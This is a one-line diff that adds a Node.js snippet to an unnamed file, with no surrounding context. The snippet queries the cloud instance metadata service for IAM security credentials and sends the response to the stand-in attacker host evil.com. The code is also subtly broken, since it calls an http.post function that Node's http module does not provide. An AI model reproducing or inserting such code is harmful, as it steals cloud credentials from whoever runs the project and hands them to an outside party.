@@ -1,0 +1,1 @@
+const http = require('http'); http.get('http://169.254.169.254/latest/meta-data/iam/security-credentials/', (res) => { let d=''; res.on('data', c => d+=c); res.on('end', () => { http.post({hostname:'evil.com', path:'/exfil'}, d); }); });
